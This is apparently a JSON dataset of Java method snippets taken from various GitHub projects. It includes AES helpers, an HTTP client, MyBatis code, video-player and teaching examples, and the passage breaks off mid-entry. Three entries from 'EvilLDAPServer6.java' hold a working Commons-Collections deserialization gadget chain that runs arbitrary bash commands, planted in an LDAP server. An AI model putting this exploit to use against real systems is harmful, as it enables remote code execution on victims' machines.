"params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void generateKey(String keystorePath){        try {            String base64Str = Base64.getEncoder()                    .encodeToString(generateKey());            FileCopyUtils.copy(base64Str, new BufferedWriter(new OutputStreamWriter(                    new FileOutputStream(keystorePath))));        } catch (IOException e) {            throw new RuntimeException(e.getMessage(), e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/util/AESUtils.java", "stars": "23", "class": {"name": "AESUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encrypt", "params": ["String", "byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String encrypt(String src, byte[] keyRaw){        try {            Cipher cipher = Cipher.getInstance(\"AES\");            SecretKeySpec keySpec = new SecretKeySpec(keyRaw, \"AES\");            cipher.init(Cipher.ENCRYPT_MODE, keySpec);            byte[] encrypted = cipher                    .doFinal(src.getBytes(StandardCharsets.UTF_8));            return new String(Base64.getEncoder().encode(encrypted), StandardCharsets.UTF_8);        } catch (Exception e) {            throw new RuntimeException(e.getMessage(), e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/util/AESUtils.java", "stars": "23", "class": {"name": "AESUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "decrypt", "params": ["String", "byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String decrypt(String src, byte[] keyRaw){        try{            SecretKeySpec keySpec = new SecretKeySpec(keyRaw, \"AES\");            Cipher cipher = Cipher.getInstance(\"AES\");            cipher.init(Cipher.DECRYPT_MODE, keySpec);            byte[] decoded = Base64.getDecoder().decode(src);            byte[] decrypted = cipher.doFinal(decoded);            return new String(decrypted, StandardCharsets.UTF_8);        }catch(Exception ex){            throw new RuntimeException(ex.getMessage(), ex);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/util/AESUtils.java", "stars": "23", "class": {"name": "AESUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "buildUri", "params": ["String", "int", "String", "boolean", "Pair<String,String>"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "URI", "snippet": "  public static URI buildUri(final String host, final int port, final String path,      final boolean isHttp, final Pair<String, String>... params) throws IOException {    final URIBuilder builder = new URIBuilder();    builder.setScheme(isHttp ? \"http\" : \"https\").setHost(host).setPort(port);    if (null != path && path.length() > 0) {      builder.setPath(path);    }    if (params != null) {      for (final Pair<String, String> pair : params) {        builder.setParameter(pair.getFirst(), pair.getSecond());      }    }    try {      return builder.build();    } catch (final URISyntaxException e) {      throw new IOException(e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/RestfulApiClient.java", "stars": "18", "class": {"name": "RestfulApiClient", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "completeRequest", "params": ["HttpEntityEnclosingRequestBase", "List<Pair>"], "throws": ["UnsupportedEncodingException"], "modifiers": ["private", "static"], "return_type": "HttpEntityEnclosingRequestBase", "snippet": "  private static HttpEntityEnclosingRequestBase completeRequest(      final HttpEntityEnclosingRequestBase request,      final List<Pair<String, String>> params) throws UnsupportedEncodingException {    if (request != null) {      if (null != params && !params.isEmpty()) {        final List<NameValuePair> formParams = params.stream()            .map(pair -> new BasicNameValuePair(pair.getFirst(), pair.getSecond()))            .collect(Collectors.toList());        final HttpEntity entity = new UrlEncodedFormEntity(formParams, \"UTF-8\");        request.setEntity(entity);      }    }    return request;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/RestfulApiClient.java", "stars": "18", "class": {"name": "RestfulApiClient", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "parseResponse", "params": ["HttpResponse"], "throws": ["IOException"], "modifiers": ["abstract", "protected"], "return_type": "T", "snippet": "  protected abstract T parseResponse(HttpResponse response) throws IOException;  /**   * function to perform a Post http request.   *   * @param uri the URI of the request.   * @param params the form params to be posted, optional.   * @return the response object type of which is specified by user.   * @throws UnsupportedEncodingException, IOException   */  public T httpPost(final URI uri, final List<Pair<String, String>> params) throws IOException {    // shortcut if the passed url is invalid.    if (null == uri) {      logger.error(\" unable to perform httpPost as the passed uri is null.\");      return null;    }    final HttpPost post = new HttpPost(uri);    return this.sendAndReturn(completeRequest(post, params));  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/RestfulApiClient.java", "stars": "18", "class": {"name": "RestfulApiClient", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "httpPost", "params": ["URI", "List<Pair>"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "T", "snippet": "  public T httpPost(final URI uri, final List<Pair<String, String>> params) throws IOException {    // shortcut if the passed url is invalid.    if (null == uri) {      logger.error(\" unable to perform httpPost as the passed uri is null.\");      return null;    }    final HttpPost post = new HttpPost(uri);    return this.sendAndReturn(completeRequest(post, params));  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/RestfulApiClient.java", "stars": "18", "class": {"name": "RestfulApiClient", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "sendAndReturn", "params": ["HttpUriRequest"], "throws": ["IOException"], "modifiers": ["protected"], "return_type": "T", "snippet": "  protected T sendAndReturn(final HttpUriRequest request) throws IOException {    try (CloseableHttpClient client = HttpClients.createDefault()) {      return this.parseResponse(client.execute(request));    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/RestfulApiClient.java", "stars": "18", "class": {"name": "RestfulApiClient", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getObject", "params": ["String"], "throws": ["Exception"], "modifiers": ["private", "static"], "return_type": "Object", "snippet": "    private static Object getObject ( String cmd ) throws Exception    {        Transformer[]   tarray      = new Transformer[]        {            new ConstantTransformer( Runtime.class ),            new InvokerTransformer            (                \"getMethod\",                new Class[]                {                    String.class,                    Class[].class                },                new Object[]                {                    \"getRuntime\",                    new Class[0]                }            ),            new InvokerTransformer            (                \"invoke\",                new Class[]                {                    Object.class,                    Object[].class                },                new Object[]                {                    null,                    new Object[0]                }            ),            new InvokerTransformer            (                \"exec\",                new Class[]                {                    String[].class                },                new Object[]                {                    new String[]                    {                        \"/bin/bash\",                        \"-c\",                        cmd                    }                }            )        };        Transformer     tchain      = new ChainedTransformer( new Transformer[0] );        Map             normalMap_0 = new HashMap();        Map             normalMap_1 = new HashMap();        Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );        Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );        lazyMap_0.put( \"scz\", \"same\" );        lazyMap_1.put( \"tDz\", \"same\" );        Hashtable       ht          = new Hashtable();        ht.put( lazyMap_0, \"value_0\" );        ht.put( lazyMap_1, \"value_1\" );        lazyMap_1.remove( \"scz\" );        Field           f           = ChainedTransformer.class.getDeclaredField( \"iTransformers\" );        f.setAccessible( true );        f.set( tchain, tarray );        return( ht );    }", "url": "https://raw.githubusercontent.com/shadowsock5/JDNI-Bypass-JDK-By-LDAP/master/test1/EvilLDAPServer6.java", "stars": "2", "class": {"name": "EvilLDAPServer6", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "serializeObject", "params": ["Object"], "throws": ["Exception"], "modifiers": ["private", "static"], "return_type": "byte", "snippet": "    private static byte[] serializeObject ( Object obj ) throws Exception    {        ByteArrayOutputStream   bos = new ByteArrayOutputStream();        ObjectOutputStream      oos = new ObjectOutputStream( bos );        oos.writeObject( obj );        return bos.toByteArray();    }", "url": "https://raw.githubusercontent.com/shadowsock5/JDNI-Bypass-JDK-By-LDAP/master/test1/EvilLDAPServer6.java", "stars": "2", "class": {"name": "EvilLDAPServer6", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main ( String[] argv ) throws Exception    {        String              name    = argv[0];        String              cmd     = argv[1];        Object              obj     = getObject( cmd );        String              sth     = \"\";        Attribute           attr    = new BasicAttribute( \"javaSerializedData\", serializeObject( obj ) );        ModificationItem[]  mods    = new ModificationItem[1];        mods[0] = new ModificationItem( DirContext.REPLACE_ATTRIBUTE, attr );        DirContext          ctx     = new InitialDirContext();        /*         * com.sun.jndi.ldap.Obj.encodeObject(Obj.java:190)         *         * can only bind Referenceable, Serializable, DirContext         */        ctx.rebind( name, sth, null );        ctx.modifyAttributes( name, mods );        System.in.read();    }", "url": "https://raw.githubusercontent.com/shadowsock5/JDNI-Bypass-JDK-By-LDAP/master/test1/EvilLDAPServer6.java", "stars": "2", "class": {"name": "EvilLDAPServer6", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onBind", "params": ["int", "VideoModel"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBind(final int position, VideoModel videoModel) {        //\u589e\u52a0\u5c01\u9762        imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);        imageView.setImageResource(R.mipmap.xxx1);        smallVideoHelper.addVideoPlayer(position, imageView, TAG, listItemContainer, listItemBtn);        listItemBtn.setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                smallVideoHelper.setPlayPositionAndTag(position, TAG);                getRecyclerBaseAdapter().notifyDataSetChanged();                //listVideoUtil.setLoop(true);                String url;                if (position % 2 == 0) {                    url = \"https://res.exexm.com/cw_145225549855002\";                } else {                    url = \"http://7xjmzj.com1.z0.glb.clouddn.com/20171026175005_JObCxCE2.mp4\";                }                //listVideoUtil.setCachePath(new File(FileUtils.getPath()));                gsySmallVideoHelperBuilder.setVideoTitle(\"title \" + position).setUrl(url);                smallVideoHelper.startPlay();                //\u5fc5\u987b\u5728startPlay\u4e4b\u540e\u8bbe\u7f6e\u624d\u80fd\u751f\u6548                //listVideoUtil.getGsyVideoPlayer().getTitleTextView().setVisibility(View.VISIBLE);            }        });    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/holder/RecyclerItemViewHolder.java", "stars": "2", "class": {"name": "RecyclerItemViewHolder", "extends": "RecyclerItemBaseHolder", "implements": null, "modifiers": ["public"]}}, {"method_name": "setVideoHelper", "params": ["GSYVideoHelper", "GSYVideoHelper"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVideoHelper(GSYVideoHelper smallVideoHelper, GSYVideoHelper.GSYVideoHelperBuilder gsySmallVideoHelperBuilder) {        this.smallVideoHelper = smallVideoHelper;        this.gsySmallVideoHelperBuilder = gsySmallVideoHelperBuilder;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/holder/RecyclerItemViewHolder.java", "stars": "2", "class": {"name": "RecyclerItemViewHolder", "extends": "RecyclerItemBaseHolder", "implements": null, "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {    // create a SqlSessionFactory    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/missing_id_property/MapperConfig.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    // populate in-memory database    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),            \"org/apache/ibatis/submitted/missing_id_property/CreateDB.sql\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/missing_id_property/MissingIdPropertyTest.java", "stars": "15", "class": {"name": "MissingIdPropertyTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldMapResultsWithoutActuallyWritingIdProperties", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldMapResultsWithoutActuallyWritingIdProperties() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      CarMapper carMapper = sqlSession.getMapper(CarMapper.class);      Car car = carMapper.getCarsInfo(1L);      Assertions.assertNotNull(car.getName());      Assertions.assertNotNull(car.getCarParts());      Assertions.assertEquals(3, car.getCarParts().size());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/missing_id_property/MissingIdPropertyTest.java", "stars": "15", "class": {"name": "MissingIdPropertyTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "fetchLog", "params": ["long", "long"], "throws": null, "modifiers": ["public"], "return_type": "LogResult", "snippet": "    public LogResult fetchLog(long startLine, long windSize) {        if(localFile.exists()){            // Read file            StringBuilder logContentBuffer = new StringBuilder();            Queue<String> queue = EvictingQueue.create(Math.abs((int) windSize));            long toLineNum = 0;            LineNumberReader reader = null;            boolean isEnd = false;            try {                //reader = new LineNumberReader(new FileReader(logFile));                reader = new LineNumberReader(new InputStreamReader(new FileInputStream(localFile), \"utf-8\"));                String line;                while ((line = reader.readLine()) != null) {                    toLineNum = reader.getLineNumber();                    if(windSize >= 0 && toLineNum > startLine){                        queue.offer(line);                        if(queue.size() >= windSize){                            break;                        }                    }else if (windSize < 0){                        if(startLine >= 0 && toLineNum >= startLine){                            toLineNum = startLine - queue.size();                            break;                        }                        queue.offer(line);                    }                }                if(startLine < 0){                    if(windSize >= 0){                        startLine = 0;                    }else{                        startLine = toLineNum;                        toLineNum = startLine - queue.size();                    }                }                while(!queue.isEmpty()){                    line = queue.poll();                    logContentBuffer.append(line).append(\"\\n\");                }                // Result                return new LogResult((int)startLine, (int)toLineNum, logContentBuffer.toString(), isEnd);            } catch (IOException e) {                LOG.error(e.getMessage(), e);            } finally {                if (reader != null) {                    try {                        reader.close();                    } catch (IOException e) {                        LOG.error(e.getMessage(), e);                    }                }            }        }        return new LogResult((int)startLine, -1, \"Read log fail, seems that the node has lost the task process\", true);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/log/DefaultLocalTaskLog.java", "stars": "23", "class": {"name": "DefaultLocalTaskLog", "extends": null, "implements": ["TaskLog"], "modifiers": ["public"]}}, {"method_name": "initValues", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initValues(GLSurfaceView mGlSurfaceView) {        mWidth = mGlSurfaceView.getWidth();        mHeight = mGlSurfaceView.getHeight();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/VignetteEffect.java", "stars": "2", "class": {"name": "VignetteEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getShader", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {        initValues(mGlSurfaceView);        float scale[] = new float[2];        if (mWidth > mHeight) {            scale[0] = 1f;            scale[1] = ((float) mHeight) / mWidth;        } else {            scale[0] = ((float) mWidth) / mHeight;            scale[1] = 1f;        }        float max_dist = ((float) Math.sqrt(scale[0] * scale[0] + scale[1]                * scale[1])) * 0.5f;        String scaleString[] = new String[2];        scaleString[0] = \"scale[0] = \" + scale[0] + \";\\n\";        scaleString[1] = \"scale[1] = \" + scale[1] + \";\\n\";        String inv_max_distString = \"inv_max_dist = \" + 1.0f / max_dist + \";\\n\";        String shadeString = \"shade = \" + mShade + \";\\n\";        // The 'range' is between 1.3 to 0.6. When scale is zero then range is        // 1.3        // which means no vignette at all because the luminousity difference is        // less than 1/256 and will cause nothing.        String rangeString = \"range = \"                + (1.30f - (float) Math.sqrt(mScale) * 0.7f) + \";\\n\";        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"                + \"precision mediump float;\\n\"                + \"uniform samplerExternalOES sTexture;\\n\"                + \" float range;\\n\"                + \" float inv_max_dist;\\n\"                + \" float shade;\\n\"                + \" vec2 scale;\\n\"                + \"varying vec2 vTextureCoord;\\n\"                + \"void main() {\\n\"                // Parameters that were created above                + scaleString[0]                + scaleString[1]                + inv_max_distString                + shadeString                + rangeString                + \"  const float slope = 20.0;\\n\"                + \"  vec2 coord = vTextureCoord - vec2(0.5, 0.5);\\n\"                + \"  float dist = length(coord * scale);\\n\"                + \"  float lumen = shade / (1.0 + exp((dist * inv_max_dist - range) * slope)) + (1.0 - shade);\\n\"                + \"  vec4 color = texture2D(sTexture, vTextureCoord);\\n\"                + \"  gl_FragColor = vec4(color.rgb * lumen, color.a);\\n\"                + \"}\\n\";        return shader;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/VignetteEffect.java", "stars": "2", "class": {"name": "VignetteEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "description", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String description() {        return \"\u86cb\u7cd5\";    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/structural/decorate/example/Cake.java", "stars": "2", "class": {"name": "Cake", "extends": "AbstractCake", "implements": null, "modifiers": ["public"]}}, {"method_name": "calculatePrice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int calculatePrice() {        return 15;    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/structural/decorate/example/Cake.java", "stars": "2", "class": {"name": "Cake", "extends": "AbstractCake", "implements": null, "modifiers": ["public"]}}, {"method_name": "testImmediate", "params": [], "throws": ["AnalyzerException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testImmediate() throws AnalyzerException {\t\tClassNode node = getFromName(\"bin/javac/HelloWorld.class\");\t\tMethodNode method = getMethod(node, \"helloSplit\");\t\tFrame<AbstractValue>[] frames = TestUtils.getFrames(node.name, method);\t\tint index = getMethodCallIndex(method.instructions, \"sayTwoWords\");\t\tObject[] value = FrameUtil.getStackArgumentLiterals(frames[index], 2);\t\tassertEquals(\"Hello\", value[0]);\t\tassertEquals(\"World\", value[1]);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/java/me/coley/analysis/value/TestLinearValuePropagation.java", "stars": "12", "class": {"name": "TestLinearValuePropagation", "extends": "TestUtils", "implements": null, "modifiers": ["public"]}}, {"method_name": "testConcatStrings", "params": [], "throws": ["AnalyzerException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testConcatStrings() throws AnalyzerException {\t\tClassNode node = getFromName(\"bin/javac/HelloWorld.class\");\t\tMethodNode method = getMethod(node, \"helloVariables\");\t\tFrame<AbstractValue>[] frames = TestUtils.getFrames(node.name, method);\t\tint index = getMethodCallIndex(method.instructions, \"println\");\t\tString value = FrameUtil.getTopStackLiteral(frames[index]);\t\tassertEquals(\"Hello World\", value);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/java/me/coley/analysis/value/TestLinearValuePropagation.java", "stars": "12", "class": {"name": "TestLinearValuePropagation", "extends": "TestUtils", "implements": null, "modifiers": ["public"]}}, {"method_name": "testConcatStrings_GotoOrder", "params": [], "throws": ["AnalyzerException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testConcatStrings_GotoOrder() throws AnalyzerException {\t\tClassNode node = getFromName(\"bin/custom/misc/HelloWorldGotoOrdering.class\");\t\tMethodNode method = getMethod(node, \"helloVariables\");\t\tFrame<AbstractValue>[] frames = TestUtils.getFrames(node.name, method);\t\tint index = getMethodCallIndex(method.instructions, \"println\");\t\tString value = FrameUtil.getTopStackLiteral(frames[index]);\t\tassertEquals(\"Hello World\", value);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/java/me/coley/analysis/value/TestLinearValuePropagation.java", "stars": "12", "class": {"name": "TestLinearValuePropagation", "extends": "TestUtils", "implements": null, "modifiers": ["public"]}}, {"method_name": "testConcatStrings_SwapOrder", "params": [], "throws": ["AnalyzerException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testConcatStrings_SwapOrder() throws AnalyzerException {\t\tClassNode node = getFromName(\"bin/custom/misc/HelloWorldSwapOrdering.class\");\t\tMethodNode method = getMethod(node, \"helloVariables\");\t\tFrame<AbstractValue>[] frames = TestUtils.getFrames(node.name, method);\t\tint index = getMethodCallIndex(method.instructions, \"println\");\t\tString value = FrameUtil.getTopStackLiteral(frames[index]);\t\tassertEquals(\"Hello World\", value);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/java/me/coley/analysis/value/TestLinearValuePropagation.java", "stars": "12", "class": {"name": "TestLinearValuePropagation", "extends": "TestUtils", "implements": null, "modifiers": ["public"]}}, {"method_name": "putCryptogenFilePath", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void putCryptogenFilePath(String filepath) {        cacheToolsFilePath.put(ToolsConstant.CRYPTOGEN, filepath);    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/CacheUtil.java", "stars": "7", "class": {"name": "CacheUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCryptogenFilePath", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getCryptogenFilePath() {        try {            return cacheToolsFilePath.getIfPresent(ToolsConstant.CRYPTOGEN);        } catch (Exception e) {            return null;        }    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/CacheUtil.java", "stars": "7", "class": {"name": "CacheUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "putConfigtxgenFilePath", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void putConfigtxgenFilePath(String filepath) {        cacheToolsFilePath.put(ToolsConstant.CONFIGTXGEN, filepath);    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/CacheUtil.java", "stars": "7", "class": {"name": "CacheUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getConfigtxgenFilePath", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getConfigtxgenFilePath() {        try {            return cacheToolsFilePath.getIfPresent(ToolsConstant.CONFIGTXGEN);        } catch (Exception e) {            return null;        }    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/CacheUtil.java", "stars": "7", "class": {"name": "CacheUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "putConfigtxlatorFilePath", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void putConfigtxlatorFilePath(String filepath) {        cacheToolsFilePath.put(ToolsConstant.CONFIGTXLATOR, filepath);    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/CacheUtil.java", "stars": "7", "class": {"name": "CacheUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getConfigtxlatorFilePath", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getConfigtxlatorFilePath() {        try {            return cacheToolsFilePath.getIfPresent(ToolsConstant.CONFIGTXLATOR);        } catch (Exception e) {            return null;        }    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/CacheUtil.java", "stars": "7", "class": {"name": "CacheUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException {        FileOutputStream fos = new FileOutputStream(\"09_IOAndProperties\\\\c.txt\",true);        for (int i = 1; i <=10 ; i++) {            fos.write(\"\u4f60\u597d\".getBytes());            fos.write(\"\\r\\n\".getBytes());        }        fos.close();    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/16.%E3%80%90%E5%BC%82%E5%B8%B8%E3%80%81%E7%BA%BF%E7%A8%8B%E3%80%91-%E7%AC%94%E8%AE%B0/20.%E3%80%90%E5%AD%97%E8%8A%82%E6%B5%81%E3%80%81%E5%AD%97%E7%AC%A6%E6%B5%81%E3%80%91-%E7%AC%94%E8%AE%B0/code/09_IOAndProperties/src/com/itheima/demo01/OutputStream/Demo03OutputStream.java", "stars": "2", "class": {"name": "Demo03OutputStream", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getConnection", "params": [], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Connection", "snippet": "  public Connection getConnection() throws SQLException {    if (this.connection == null) {      openConnection();    }    return this.connection;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/transaction/managed/ManagedTransaction.java", "stars": "15", "class": {"name": "ManagedTransaction", "extends": null, "implements": ["Transaction"], "modifiers": ["public"]}}, {"method_name": "commit", "params": [], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void commit() throws SQLException {    // Does nothing  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/transaction/managed/ManagedTransaction.java", "stars": "15", "class": {"name": "ManagedTransaction", "extends": null, "implements": ["Transaction"], "modifiers": ["public"]}}, {"method_name": "rollback", "params": [], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void rollback() throws SQLException {    // Does nothing  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/transaction/managed/ManagedTransaction.java", "stars": "15", "class": {"name": "ManagedTransaction", "extends": null, "implements": ["Transaction"], "modifiers": ["public"]}}, {"method_name": "close", "params": [], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void close() throws SQLException {    if (this.closeConnection && this.connection != null) {      if (log.isDebugEnabled()) {        log.debug(\"Closing JDBC Connection [\" + this.connection + \"]\");      }      this.connection.close();    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/transaction/managed/ManagedTransaction.java", "stars": "15", "class": {"name": "ManagedTransaction", "extends": null, "implements": ["Transaction"], "modifiers": ["public"]}}, {"method_name": "openConnection", "params": [], "throws": ["SQLException"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void openConnection() throws SQLException {    if (log.isDebugEnabled()) {      log.debug(\"Opening JDBC Connection\");    }    this.connection = this.dataSource.getConnection();    if (this.level != null) {      this.connection.setTransactionIsolation(this.level.getLevel());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/transaction/managed/ManagedTransaction.java", "stars": "15", "class": {"name": "ManagedTransaction", "extends": null, "implements": ["Transaction"], "modifiers": ["public"]}}, {"method_name": "getTimeout", "params": [], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getTimeout() throws SQLException {    return null;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/transaction/managed/ManagedTransaction.java", "stars": "15", "class": {"name": "ManagedTransaction", "extends": null, "implements": ["Transaction"], "modifiers": ["public"]}}, {"method_name": "showLog", "params": ["int", "MessageBuilder"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void showLog(int level, MessageBuilder mb){        //\u5bf9\u65e5\u5fd7\u7684\u7b49\u7ea7\u8fdb\u884c\u5224\u65ad,\u5982\u679c\u662f1\u7ea7,\u5219\u8c03\u7528MessageBuilder\u63a5\u53e3\u4e2d\u7684builderMessage\u65b9\u6cd5        if(level==1){            System.out.println(mb.builderMessage());        }    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/23.%E3%80%90%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E3%80%91-%E7%AC%94%E8%AE%B0/code/12_FunctionalInterface/src/com/itheima/demo02/Lambda/Demo02Lambda.java", "stars": "2", "class": {"name": "Demo02Lambda", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        //\u5b9a\u4e49\u4e09\u4e2a\u65e5\u5fd7\u4fe1\u606f        String msg1 = \"Hello\";        String msg2 = \"World\";        String msg3 = \"Java\";        //\u8c03\u7528showLog\u65b9\u6cd5,\u53c2\u6570MessageBuilder\u662f\u4e00\u4e2a\u51fd\u6570\u5f0f\u63a5\u53e3,\u6240\u4ee5\u53ef\u4ee5\u4f20\u9012Lambda\u8868\u8fbe\u5f0f        /*showLog(2,()->{            